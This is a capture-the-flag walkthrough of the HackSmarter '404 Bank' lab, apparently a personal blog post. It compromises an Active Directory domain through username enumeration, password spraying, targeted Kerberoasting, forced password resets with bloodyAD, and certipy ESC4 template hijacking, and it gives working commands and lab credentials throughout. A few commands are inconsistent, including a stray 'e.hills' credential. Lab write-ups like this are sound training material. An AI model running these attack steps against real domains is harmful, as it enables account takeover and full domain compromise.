---
title: "HackSmarter 404 Bank Walkthrough  "
date: 2026-05-29 00:00:00 +0000
categories: [ HackSmarterlabs]
tags: [Hacksmarterlabs , Active Directory]
---

<img width="2048" height="1152" alt="image" src="https://github.com/user-attachments/assets/a9bf8598-e954-4db8-9350-5f3be8f1a606" />


## Scenario : 

404 Bank, a staple of the local financial community, is conducting its annual security assessment. To uphold their motto of being "Proven, Local, Strong," the bank has commissioned the Hack Smarter Red Team to perform an internal penetration test.


## Solution : 

First thing first , we start with an nmap scan  : 

```bash
nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN Open_Ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN Nmap_sV_sC_Results.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN Nmap_Vuln_Results.txt
```

<img width="1155" height="664" alt="image" src="https://github.com/user-attachments/assets/1414ed82-1969-40f6-b614-7cca9ff91ae4" />

We can tell this is the DC since it has kerberos open ,  ldap , and DNS as well , since this is an AD machine , first thing i like to do is use nxc to  get the Domain name as well as the hostname and add them to our hosts file . 

<img width="1159" height="554" alt="image" src="https://github.com/user-attachments/assets/694fa487-4213-4e21-99dc-eb8e0f3d2489" />

This is an AD machine so i always follow this quick checklist from my methdology : 

```bash
Scan All TCP Ports : Check The useful note Down for more info .
Check ldap , rpc , smb with anonymous access . Check for Public Shares .
Find Usernames : Find usernames in Web Site and generate a Username List maybe . if you get access , Look for usernames using netexec , –rid-brute , –users and enumdomuser with RPC client .
Check usernames found with kerbrute .
Search for ASREP Roastable Users .
Once we have valid Creds : Check Kerberoastable users + Spray the password on all users .
Try to authenticate using every protocol .
Enumerate shares with those Users found . Use netexec to download .
Check Certipy for Vulnerable Templates if there is an ADCS in place .
If we get a Shell , try privesc , dump all Hashes using netexec or locally and store into a file .
If we can’t privesc , we can move to Blood Hound .
```

Now first thing we should try is to generate a list of valid usernames via anonymous access, for this i like to use nxc : 

<img width="1534" height="694" alt="image" src="https://github.com/user-attachments/assets/588dfed7-07e9-48d8-84b2-8ee6aeade320" />

As we can see , we can't get any users via anonymous access , and the guest account is disabled , i tried connecting via RPC as well but couldn't get a list of usernames that way either , we can't list shares anonymously as well .

<img width="1279" height="389" alt="image" src="https://github.com/user-attachments/assets/6ab287bc-1cd7-4aba-a141-237422345495" />

let's check the website .              

<img width="1363" height="830" alt="image" src="https://github.com/user-attachments/assets/2fbe70c2-2c16-4962-bff3-7cc84dd835b9" />

If we visit the website , we get a list of usernames that we can use to generate a wordlist that we can test using Kerbrute .  

Now to generate a combination ofusernames i like to use this tool : 

```bash
#https://raw.githubusercontent.com/mohinparamasivam/AD-Username-Generator/refs/heads/master/username-generate.py
python3 username-generator.py -u username.txt -o genrated_username.txt  
```
<img width="1153" height="510" alt="image" src="https://github.com/user-attachments/assets/7d882f26-3118-4449-9b4e-2ff798c5e12a" />

First we add all the names we found into a file , then use the tool to generate all possible combinations , and finally we test if these are valid via Kerbrute .

<img width="1264" height="497" alt="image" src="https://github.com/user-attachments/assets/72ed6062-d295-47b8-931c-55deb4d77762" />

```bash
kerbrute userenum generated_usernames.txt --dc $target -d 404finance.local  
```

<img width="1191" height="681" alt="image" src="https://github.com/user-attachments/assets/0ef440ec-47f6-4c76-bdc1-c68e9c2415f1" />

Now first thing i would try is ASREPROASTING against these users . 

<img width="1309" height="501" alt="image" src="https://github.com/user-attachments/assets/88e32755-208a-4e8e-a475-24bf1a39d907" />

Sadly that didnt work , i also tried checking LDAP using ldapsearch and other tools but that didn't work as well .  let's enumerate the web app further since this is the only thing we've got for now . 

<img width="1208" height="745" alt="image" src="https://github.com/user-attachments/assets/b6b2928b-8e9a-4dcb-be64-7943760fb76a" />

We do find an executable , we can download it and run ghidra to reverse engineer it , maybe it has some credentials inside the code , you never know . 

<img width="1388" height="688" alt="image" src="https://github.com/user-attachments/assets/b88297b5-ff36-4dc4-b67a-6b6d406f7410" />

Upon opening the file on Gidra we find this string that we can try and decode since it looks like Base64 . 

<img width="1147" height="789" alt="image" src="https://github.com/user-attachments/assets/6e959e5a-232c-4163-8e40-1e453048a10d" />

Upon decoding it we find that the string is in md5 format , which we can crack with john easily . Now we can try to spray this password , we already generated a list of valid usernames . 

<img width="1505" height="429" alt="image" src="https://github.com/user-attachments/assets/9c4e0c32-e72c-4039-a76d-ce2e6b742fcf" />

Perfect , now we've got our foothold : "404finance.local\karl.hackermann:Password123!!" , Let's try kerberoasting now that we've got a set of valid creds . 

<img width="1315" height="337" alt="image" src="https://github.com/user-attachments/assets/beab1e21-0e32-4294-8408-7426977c08d0" />

Nothing useful , let's run Bloodhound and check the shares and winrm access while we wait , commands to setup Bloodhound as well as the ingestor (i use nxc to generate the ZIP file) : 

```bash
# To get the ZIP file :
nxc ldap $target -u 'e.hills' -p 'Il0vemyj0b2025!' --bloodhound --collection All --dns-server $target
# To run BloodHound : 
https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
sudo ./bloodhound-cli install
./bloodhound-cli resetpwd
Visit : http://localhost:8080/ui/login 
```

Now for the Shares and winrm , our user can't login via winrm , and for the shares we only find the default ones . 

<img width="1658" height="536" alt="image" src="https://github.com/user-attachments/assets/06706bec-9fbe-4e78-8ddd-8decef5c3844" />

Now let's take a look at the ACLs on Bloodhound . 

<img width="1198" height="494" alt="image" src="https://github.com/user-attachments/assets/f6e7476e-6090-4d46-918d-f7338718a613" />

Our user has Generic Write over Tom.Reboot , we can try target Kerberoasting , by adding an SPN and then attempting to crack the TGS , a tool that we can use to do this :


```bash
git clone https://github.com/ShutdownRepo/targetedKerberoast.git 
cd targetedKerberoast.git
python3 targetedKerberoast.py -v -d '404FINANCE.local' -u 'KARL.HACKERMANN' -p 'Password123!!'
```

<img width="1502" height="694" alt="image" src="https://github.com/user-attachments/assets/eb20786a-5f4f-46bc-b121-f2d64738ac37" />

Perfect , now we can try and crack the Hash using John . 

<img width="1327" height="583" alt="image" src="https://github.com/user-attachments/assets/d6032377-371b-45d4-bcc3-842b754694bb" />

Perfect , now we've got a new set of credentials : -u tom.reboot -p 'P@ssw0rd123'  . From Bloodhound , we already know that this user is part of the Certificate Service group . this is always worth investigating since CA group members often have elevated privileges over certificate templates, making it a good reason to run Certipy and check for ESC vulnerabilities.

<img width="1462" height="497" alt="image" src="https://github.com/user-attachments/assets/1aeb19e6-390b-47d9-8881-32bde81b9511" />

We can check using certipy : 

```bash
certipy-ad find  -u tom.reboot -p 'P@ssw0rd123' -dc-ip $target -vulnerable 
```

<img width="1094" height="518" alt="image" src="https://github.com/user-attachments/assets/45eccb89-6d21-4c7d-80ee-ae309f4153ab" />

Sadly this didn't return anything useful . 

Now going back to Bloodhound , we see that tom.reboot has Force change password over the user ROBERT.GRAEF , to abuse this , we can use net rpc (as mentionned on Bloodhound) . 

<img width="1493" height="578" alt="image" src="https://github.com/user-attachments/assets/61c4c480-ee35-4622-904c-fcfcc82bac13" />

```bash
net rpc password "ROBERT.GRAEF" "Password.123" -U "404FINANCE.LOCAL"/"tom.reboot"%"P@ssw0rd123" -S "DC-404.404finance.local"
```

<img width="1599" height="557" alt="image" src="https://github.com/user-attachments/assets/f42d3b56-1b41-4e5e-93fe-1d8fc3783c96" />

Looking back at Bloodhound, we can see that the user Robert has Force Change password on 3 other users and can add members to the Remote Desktop Group . 

<img width="862" height="727" alt="image" src="https://github.com/user-attachments/assets/b8fa2869-e1d6-41f2-8ab4-aee91f55fa7f" />

Now one thing we can try is change the passwords for all 3 users and then add them all to the remote desktop group to be able to login via RDP . To change the passwords either use net rpc or BloodyAD , i already used net rpc on pretty much all of my walkthroughs , so i figured try BloodyAD this time . 

```bash
bloodyAD --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'Password.123' set password 'MELANIE.KUNZ' 'WEAK123.' 
bloodyAD --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'Password.123' set password 'JAN.TRESOR' 'WEAK123.'  
bloodyAD --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'Password.123' set password 'NINA.INKASSO' 'WEAK123.'
```
<img width="1756" height="608" alt="image" src="https://github.com/user-attachments/assets/e0708fd2-8a5b-4e57-96cc-156e6d0acc98" />

Perfect now we just add these 3 to the RDP group and login via xfreerdp : MELANIE.KUNZ / NINA.INKASSO / JAN.TRESOR

```bash
┌──(kali㉿kali)-[~/HackSmarter/404-Bank]
└─$ bloodyad  --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'Password.123' add groupMember 'REMOTE DESKTOP USERS' 'JAN.TRESOR'
[+] JAN.TRESOR added to REMOTE DESKTOP USERS
                                                                                                                                                             
┌──(kali㉿kali)-[~/HackSmarter/404-Bank]
└─$ bloodyad  --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'Password.123' add groupMember 'REMOTE DESKTOP USERS' 'NINA.INKASSO'
[+] NINA.INKASSO added to REMOTE DESKTOP USERS
                                                                                                                                                             
┌──(kali㉿kali)-[~/HackSmarter/404-Bank]
└─$ bloodyad  --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'Password.123' add groupMember 'REMOTE DESKTOP USERS' 'MELANIE.KUNZ'
[+] MELANIE.KUNZ added to REMOTE DESKTOP USERS
```

<img width="1910" height="600" alt="image" src="https://github.com/user-attachments/assets/9a33584d-7bc7-4d7b-a0aa-205df29e230f" />

I tried login in with all of these , but to save you time , the user JAN.TRESOR had some deleted emails in his recycle bin . 

<img width="1267" height="775" alt="image" src="https://github.com/user-attachments/assets/41e12ef3-e1a7-4c6b-acd1-3c4a9842fbff" />

We see that a user named svc.services was disabled due to an ESC vulnerability , and that the user Robert who we already comrpomised can reactivate this account .

The path is pretty clear now , we should find a way to reactivate the account (probably through the use of BloodyAD) and then use certipy to exploit the ESC vulnerability . We can also confirm the fact that we have control over activating the SVC user from Bloodhoud :

<img width="1370" height="553" alt="image" src="https://github.com/user-attachments/assets/e33a77d4-b06b-41ee-a1ec-a71fdd6e16f9" />

```bash
bloodyad --host DC-404.404finance.local -d '404finance.local' -u 'ROBERT.GRAEF' -p 'Password.123' remove uac 'svc.services' -f ACCOUNTDISABLE
```

<img width="1904" height="360" alt="image" src="https://github.com/user-attachments/assets/22603abc-aa1c-4093-b5b5-2864cedf6e5d" />

Now that the account is enabled, we need the password :) . 

I tried spraying the passwords we gathered but nothing seems to work . If we check the other recovered emails , we find a password in one of them , we can try spraying this one as well . 

<img width="1182" height="712" alt="image" src="https://github.com/user-attachments/assets/d5ad73aa-80d5-4cee-976e-1fbe0b2d38ec" />

Let's spray this password now : RemoteAccess!2024

<img width="1587" height="755" alt="image" src="https://github.com/user-attachments/assets/e1eae830-2214-46f6-a6e4-3da4afeabc5f" />

Perfect , we have Hoffmann's password . Just like earlier , let's add him to the RDP group so that we can connect via RDP , maybe we will find something in the recycle bin :) 

<img width="1894" height="501" alt="image" src="https://github.com/user-attachments/assets/070e6ad6-0593-4b91-82d8-774896feefde" />

Once we connect, we get the user flag on the desktop , looking back at Bloodhound , we see that hoffman has Force change password on the user WebAdmin . 

<img width="1404" height="398" alt="image" src="https://github.com/user-attachments/assets/cef0fcd6-f98b-4b5f-b77f-20a713d4a6d1" />

```bash
bloodyAD --host DC-404.404finance.local -d '404finance.local' -u 'DANIEL.HOFFMANN' -p 'RemoteAccess!2024' set password 'WEBADMIN' 'WEAK123.' 
```

<img width="1897" height="719" alt="image" src="https://github.com/user-attachments/assets/6372a8da-6ba0-4c43-a8f2-1ac816f55c7d" />

Now finally we can login as the WEBADMIN. 

<img width="1510" height="606" alt="image" src="https://github.com/user-attachments/assets/f6051c66-d9df-438a-a612-aa8d920aa9c5" />

Since this is a WEB service account , we should visit /interpub/wwwroot folder , we find a ZIP File that we can transfer back to our machine , we can do that easily since we already have a shared drive between our kali machine and the windows machine . 

<img width="1304" height="636" alt="image" src="https://github.com/user-attachments/assets/88518bca-7ff0-4a1e-9ef9-4520d201ab77" />

As we can see it is password protected , we can use john to crack it before unzipping it . 

<img width="1172" height="476" alt="image" src="https://github.com/user-attachments/assets/a6f0336d-cf76-4c9a-b39f-549a710121bf" />

Rockyou didn't work , for this i decided to use a tool that will crawl the website and generate a custom wordlist that we can try , i used cewl for this : 

<img width="1177" height="547" alt="image" src="https://github.com/user-attachments/assets/39597f8b-68da-4ac3-af73-74ab0ebcaaa7" />

This cracks it almost immediately : 

<img width="1219" height="428" alt="image" src="https://github.com/user-attachments/assets/953ed76d-086c-4395-8792-9e0e0c69ce02" />

Inside of the zipfile we find a .dat file that has the password for svc.services user :)

<img width="1292" height="524" alt="image" src="https://github.com/user-attachments/assets/aa94ac08-9942-4a08-8c15-c144a00306e8" />

perfect we can verify these creds via nxc then run certpiy : 

<img width="1326" height="632" alt="image" src="https://github.com/user-attachments/assets/fa0edc2c-7fbd-497c-baf5-a964998a4bd1" />

From certipy result we find that we have an ESC4 or what's called Template Hijacking that we can abuse to get DA . 

```bash
certipy-ad find -u 'svc.services' -p 'S3rv1cePower2024!' -dc-ip $target -vulnerable
```

<img width="1656" height="689" alt="image" src="https://github.com/user-attachments/assets/271ae05a-6e84-4fd2-9f2c-2f971bcc47e2" />

Now to abuse this i followed the guide on certipy wiki : 

```bash
https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
certipy-ad find -u 'svc.services' -p 'S3rv1cePower2024!' -dc-ip $target -vulnerable
```

ESC4 occurs when an attacker has write privileges over a certificate template (Write Owner, WriteDacl, WriteProperty, or Full Control). This allows them to modify the template's settings and introduce misconfigurations , essentially turning a secure template into an ESC1-vulnerable one, and from there requesting a certificate on behalf of any user including a Domain Admin.
We first Mofidy the Template to make it Vulnerable . 

```bash
certipy-ad template \
    -u 'svc.services@404finance.local' -p 'S3rv1cePower2024!' \
    -dc-ip $target -template 'Vuln-ESC4' \  
    -write-default-configuration
```

<img width="1142" height="676" alt="image" src="https://github.com/user-attachments/assets/2b4b3e7c-2fb0-46a7-bd28-7b3762f1f919" />

From here we can exploit it like a normal ESC1 , we just need the SID of the administrator , we can find it on Bloodhound :) 

```bash
certipy-ad req \
    -u 'svc.services@404finance.local' -p 'S3rv1cePower2024!' \
    -dc-ip $target -target 'DC-404.404finance.local' \
    -ca '404finance-DC-404-CA' -template 'Vuln-ESC4' \
    -upn 'administrator@404finance.local' -sid 'S-1-5-21-2956725473-317782918-2795636496-500'
```

<img width="1218" height="391" alt="image" src="https://github.com/user-attachments/assets/cfdc05c7-def3-4894-bac3-8a9a4e17bfb8" />

```bash
certipy-ad auth -pfx 'administrator.pfx' -dc-ip $target 
```
<img width="1466" height="402" alt="image" src="https://github.com/user-attachments/assets/1fe5eba8-844f-4b43-83ba-fa46ed49a0f0" />

Now finally we just login via winrm using the Domain Administrator Hash , and from there we get the flag . 

<img width="1040" height="670" alt="image" src="https://github.com/user-attachments/assets/7df6394b-79ba-4bf4-bf13-a4a54c7d350e" />

That was it for This lab , See you in the next one :) 


